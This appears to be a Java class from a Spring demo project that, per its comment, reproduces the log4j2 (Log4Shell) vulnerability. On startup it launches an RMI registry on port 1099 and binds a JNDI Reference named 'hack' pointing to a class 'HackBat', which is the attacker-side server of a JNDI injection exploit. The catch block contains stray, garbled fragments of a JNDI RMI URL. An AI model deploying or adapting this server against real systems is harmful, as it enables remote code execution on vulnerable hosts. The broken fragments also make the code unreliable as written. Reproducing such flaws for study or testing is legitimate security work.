package com.qiuhuanhen.springroot.application.command.impl;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.annotation.PostConstruct;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * ClassName: RmiCommandServiceImpl 注意这里我们不要 <br/>
 * Description: 还原log4j2的漏洞 <br/>
 * date: 2021/12/14 11:15<br/>
 *
 * @author qkj <br/>
 * @since JDK 1.8
 */
public class RmiCommandServiceImpl {
    @PostConstruct
    // 模拟启一个服务
    public Runnable startRimServer() {
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                try {
                    // 启动服务
                    LocateRegistry.createRegistry(1099);
                    Registry registry = LocateRegistry.getRegistry();
                    // 创建资源 null表示本地
                    Reference reference = new Reference("com.qiuhuanhen.springroot.domain.model.HackBat",
                            "com.qiuhuanhen.springroot.domain.model.HackBat", null);
                    ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
                    // 绑定资源
                    registry.bind("hack", referenceWrapper);
                    System.out.println("rmi服务初始化完成--------------------");
                } catch (Exception e) {
                    jndi:
                    rmi:
//127.
                    e.printStackTrace();
                }
            }
        };
        return runnable;
    }
}
